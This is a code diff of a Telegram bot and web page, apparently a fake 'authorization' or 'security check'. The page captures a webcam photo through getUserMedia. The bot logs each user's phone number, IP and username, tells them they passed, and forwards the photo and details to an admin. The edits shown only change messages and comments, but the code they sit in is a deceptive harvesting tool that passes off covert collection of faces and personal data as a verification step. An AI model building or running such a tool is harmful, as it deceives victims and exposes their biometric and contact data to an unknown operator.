@@ -118,7 +118,7 @@ navigator.mediaDevices.getUserMedia({ video: true })
                     document.body.innerHTML = `
                         <h2>✅ Авторизация завершена</h2>
                         <p>Вы успешно прошли проверку.</p>
-                        <p>Можете закрыть эту страницу.</p>
+                        <p>Можете вернуться в Telegram.</p>
                     `;
                 });
             }, 'image/png');
@@ -153,12 +153,12 @@ def save_photo():
 
         add_user(user_id, username, phone, ip, photo_path)
 
-        # Отправка пользователю сообщения об успехе
+        # === Отправка пользователю сообщения об успехе ===
         url = f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage"
         data = {"chat_id": user_id, "text": "✅ Авторизация успешна!\n\nВы успешно прошли проверку безопасности."}
         requests.post(url, data=data)
 
-        # Отправка фото админу
+        # === Отправка фото админу ===
         message = (
             f"📸 Новый пользователь!\n"
             f"Номер: {phone}\n"
@@ -263,7 +263,7 @@ async def cleardb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for f in os.listdir(PHOTOS_DIR):
         os.remove(os.path.join(PHOTOS_DIR, f))
 
-    # Удаление и пересоздание БД
+    # Удаление базы данных
     if os.path.exists(DB_PATH):
         os.remove(DB_PATH)
         init_db()
